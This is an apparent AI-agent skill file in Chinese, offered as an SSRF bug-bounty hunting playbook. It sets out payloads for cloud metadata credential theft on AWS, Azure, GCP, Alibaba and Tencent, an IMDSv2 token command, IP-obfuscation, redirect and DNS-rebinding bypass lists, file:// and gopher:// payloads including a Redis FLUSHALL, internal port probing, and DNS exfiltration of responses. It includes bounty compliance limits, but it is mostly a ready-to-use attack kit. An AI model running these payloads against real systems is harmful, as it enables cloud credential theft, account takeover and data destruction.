---
name: hunt-ssrf
description: >
  SSRF 服务端请求伪造狩猎手册（低成本高价值漏洞，linkage 阶段优先测）。
  来源：hunt-ssrf 技能（15 份公开赏金报告提炼：AWS/GCP/Azure 元数据 SSRF、DNS rebinding、
  短链绕过、gopher→Redis RCE、headless 浏览器 PDF 渲染链）+ 台账 3 个实战案例
  （图片审核盲打、小程序头像 store-and-read 云接管、低代码调试全回显）+ 云元数据端点表。
  触发条件：任何"服务端拉取 URL"的参数/功能。OOB 确认是盲打唯一判定标准。
metadata:
  tags: "ssrf,imds,cloud-metadata,oob,dnslog,redirect-bypass,webhook,url-fetch"
  category: "offensive-security"
---

# SSRF 狩猎手册（hunt_ssrf）

> **为什么优先测**：探测成本 = 把参数值换成目标地址发几个请求（秒级、低噪音、不触发 WAF），
> 价值 = 云凭证泄露（云接管/数据泄露，SRC 高危起步）。**性价比全漏洞类型第一梯队。
> 本 skill 定位在 linkage 阶段（🟡 普通测试）就开打，不等 highrisk 门——那是"已有洞后的升级"，不是"找洞"。**
> 相关：`knowledge/references/decision-trees/06-ssrf.md`（合规边界/决策流程）、
> `knowledge/references/cloud-attack-surface.md` §8（云元数据+Store-and-Read）、
> `knowledge/experience/ssrf.md`（3 个实战案例精读）。

---

## 0. 识别信号（命中即读本文件，linkage 阶段逐条核对）

### 参数名（GET/POST/JSON body 里出现即测）
```
url uri endpoint redirect src source feed host target dest file path callback image load fetch
link preview_url avatar_url userAvatar webhook_url image_url cover_url return_url next_url
```

### 功能形态（比参数名更可靠的信号——按功能找参数）
| 功能 | 特征 | 备注 |
|---|---|---|
| 上传/审核/转存/水印/压缩/预览 | 提交 URL 由服务端拉取 | **业务错误消息即 fetch 证明**（"图片违规"= 真拉取了） |
| 头像/封面/富文本图片 | userAvatar/avatarUrl/coverUrl 字段 | store-and-read 可把盲打变回显 |
| 低代码/开放平台 API 调试 | "测试/调试 API" 弹窗 | **全回显 SSRF 原语**，最强形态 |
| 链接预览/unfurl/分享卡片 | 提交链接生成预览 | Reddit/Slack 模式 |
| Webhook 注册/回调配置 | 填 URL 触发回调 | 回调目标可换内网 |
| PDF/截图生成（headless） | 渲染用户模板/URL | 可注入 `<iframe src=内网>` 读响应 |
| 文件导入（XML/CSV/远程 schema） | 拉远程资源 | 可能 XXE+SSRF 双料 |
| 二维码/短链生成 | redirectUrl/url 参数 | 内容回显载体 |

### JS 特征（recon 阶段留意）
`fetch(userInput)` / `axios.get(params.url)` / `url: req.body.url` / `src: params.source` / `href: query.endpoint`

---

## 1. OOB-Or-It-Didn't-Happen 判定门（盲打铁律，先读）

**盲打 SSRF 的确认必须有 OOB 回调：dnslog.cn（最快，methodology §4 首选）或 interactsh-client。**
探测时把回调地址**按 sink 加子标签**（`img.<dnslog>`, `import.<dnslog>`…），回调能定位是哪个功能打的。

### 什么【不算】确认（三件最容易误报的事）
- ❌ 服务端把你的 URL 回显在错误消息里（"The Web application at http://evil/x could not be found"
  只是字符串格式化，不代表发过请求）
- ❌ 外部 URL 与 localhost 返回不同状态码（可能是 scheme 校验器的差异，不是真拉取）
- ❌ 响应延迟变大（可能只是 DNS 解析耗时，不是完成了 HTTP fetch）

### 什么【算】确认
- ✅ dnslog/OOB 面板收到你的唯一子域名解析记录
- ✅ OOB HTTP 端点收到带服务端来源 IP/UA 的请求
- ✅ headless 场景：渲染进程对你的回调 URL 发起 fetch

### 默认流程
1. 先种 OOB 子域（按 sink 分标签）→ 2. 把回调 URL 填入参数发请求 → 3. 等 30-120s 轮询面板
→ 4. 只有回调实锤才算 SSRF。零回调 = 撤回结论，即使错误消息回显了 URL。

> 台账教训：SharePoint `download.aspx?SourceUrl=` 返回 500 且错误页回显攻击者 URL，
> 12+ 个 URL 参数 × 38 个打点零回调——"回显"是客户端错误串格式化，不是 SSRF。
> 直接报会被 triage 打 N/A。

---

## 2. 云元数据 Payload 表（确认 SSRF 后第一优先打这个，凭证=高危及上）

| # | Payload | 目标 | 要点 |
|---|---|---|---|
| 1 | `http://169.254.169.254/latest/meta-data/` | AWS IMDSv1 | 无认证直接读 |
| 2 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS IAM 角色名 | 有角色名再拼 `<角色名>` 读 AK/SK |
| 3 | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + 头 `Metadata: true` | Azure IMDS | **必须带头**，无头返回 400 |
| 4 | `http://metadata.google.internal/computeMetadata/v1/` + 头 `Metadata-Flavor: Google` | GCP | 带头；SA token 在 `/instance/service-accounts/default/token` |
| 5 | `http://100.100.100.200/latest/meta-data/` | 阿里云 | 根目录即 meta-data |
| 6 | `http://metadata.tencentyun.com/meta-data/` | 腾讯云 | 非 169.254；CAM 凭证 `/meta-data/cam/role-security-credentials/<角色名>`（台账实证） |
| 7 | `http://[::ffff:a9fe:a9fe]/latest/meta-data/` | AWS IPv6 映射绕过 | a9fe:a9fe = 169.254.169.254 的 IPv6 映射形态，过纯 IPv4 黑名单 |

**读取顺序**：先根目录（证明可达）→ 角色名列表 → 具体凭证端点。**合规红线：拿到 TmpSecretId/TmpToken/AK/SK 即停并报告（TIER 3），不实际调用云 API、不读 COS/OSS 数据。**

### IMDSv2（AWS 强制 token 时）
```bash
# 仅当 SSRF 支持 PUT + 自定义头（部分库/调试代理支持 method 覆盖）
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# 后续 GET 带: X-aws-ec2-metadata-token: $TOKEN
```
只支持 GET 的 SSRF 遇上 IMDSv2：元数据返回 401 是"被 token 挡"而非"不可达"，别误判为不存在。

---

## 3. 绕过变体表（黑名单拦截 169.254/127.x/内网段时逐条试）

### URL 解析差异（过 IP 黑名单的经典系）
```
http://169.254.169.254@evil.com/           # @ 前内容被部分解析器忽略
http://2852039166/latest/meta-data/        # 十进制 IP (=169.254.169.254)
http://0xA9FEA9FE/latest/meta-data/        # 十六进制 IP
http://0251.0376.0251.0376/                # 八进制点分 (=169.254.169.254)
http://025177524776/                       # 八进制单整数（部分解析器）
http://[::ffff:169.254.169.254]/           # IPv6 映射
http://[::ffff:a9fe:a9fe]/                 # IPv6 映射（hex 形态）
http://169.254.169.254.nip.io/             # DNS 通配（解析到该 IP）
http://0x7f000001/ / http://2130706433/    # 127.0.0.1 的 hex/十进制
http://127.1/ / http://0/                  # 短写（部分系统 0=本机）
http://localhost/ / http://Localhost/      # 大小写混用过区分大小写黑名单
```

### 重定向/短链绕过（过域名黑名单）
- **302 链**：自己 VPS 上部署 302 → 内网/元数据。HEAD 返回 200、GET 跳 302 可过"预检型"校验
- **第三方短链**：把元数据 URL 转短链（dzxf119.cn 类）→ 短链域名不在黑名单 → 服务端 302 跟随到元数据（台账案例 3 实证）
- **DNS rebinding**：TTL=0 域名，校验时解析外网 IP、请求时解析到 169.254.169.254（`lock.cmpxchg8b.com/rebinder.html` 生成）

### 协议混淆（仅在明确授权/靶场场景，SRC 默认不做）
```
file:///etc/passwd                    # 读本地文件（SRC 允许,自己账号）
dict://127.0.0.1:6379/INFO            # 端口探测
gopher://127.0.0.1:6379/_FLUSHALL     # Redis 交互（SRC 禁止,除非授权渗透）
ldap:// / sftp://                     # 其他协议
```

---

## 4. 攻击面扫描流程（linkage 阶段执行顺序）

```
Step 1  枚举 URL 类参数：browser_probe open/xhr 抓 XHR 参数、ffuf -w paramDict 扫 ?url=
        （含 JS 里挖出的业务参数名,最高信噪比）
Step 2  每类参数先打 OOB（dnslog 子标签区分 sink）→ 有回调=SSRF 确认,进 Step 3
Step 3  云元数据表逐条打（§2）→ 有内容=凭证级
Step 4  内网探测分层（每层只证明可达,不深挖）:
        http://127.0.0.1:80 → :8080 → :6443(K8s API) → :10250(kubelet) → :2379(etcd)
        → :9090(Prometheus) → :9200(ES) → :6379(Redis) → :8500(Consul)
Step 5  有白名单/黑名单 → §3 绕过表逐条试（每条都配 OOB 验证）
Step 6  盲打场景 → §5 盲打技巧三连
```

**时序 oracle（盲打枚举 IAM 角色/内网端口）**：响应大小与耗时正相关——同一个 pingback 类
盲打接口（如 WordPress xmlrpc pingback.ping），换 URL 测耗时：角色存在=JSON 响应更慢、
404=更快。每个值测 3 次取中位数，基线方差 >20% 时结果不可信。

---

## 5. 盲打技巧三连（响应不回显时的确认/升级手段）

1. **业务错误消息即 fetch 证明**：上传/审核/转存类接口返回"图片违规/下载失败/格式错误"
   = 服务端真的拉取了你的 URL。这是**业务层 oracle**，比 OOB 还直接，且能定位到具体功能。
2. **Store-and-Read（盲打变回显）**：用户提交 URL → 服务端拉取 → 结果存储 → 存储路径公开可访问
   （头像/水印/压缩/导入类功能）。提交元数据地址后 GET 回显的 CDN 路径即可读到 SSRF 响应
   （台账案例 2：userAvatar → 腾讯云元数据 → CAM STS 全回显）。
3. **DNS 外带数据**：headless/JS 执行场景，`btoa(响应).子域.回调域` 编码外带；或 pingback 类
   接口把元数据内容拼进第二个参数（URL 编码）触发二次请求外带。

---

## 6. 验证与收尾（FOUND→CONFIRMED 的标准）

- 证据链：请求原文（xsreq 落盘）+ OOB 回调截图/日志行 + 响应内容（元数据/内网响应）。
- 三级分类：回调+内容=CONFIRMED；仅回调无内容=CONFIRMED(盲打,写明可达范围)；
  仅错误回显/延迟差异=**PENDING 或直接弃**（判定门 §1）。
- 影响描述写"能做什么"：如"可读取云元数据 → 泄露 IAM 临时凭证 → 云账号接管"而非"存在 SSRF"。
- 影响升级看链：SSRF → 元数据 → 云接管；SSRF → 内网未授权接口 → 数据泄露；SSRF → Redis(gopher) → RCE（仅授权渗透）。
- 合规：只证明可达即停；内网探测不做端口全扫；凭证级证据到手即停手写报告。
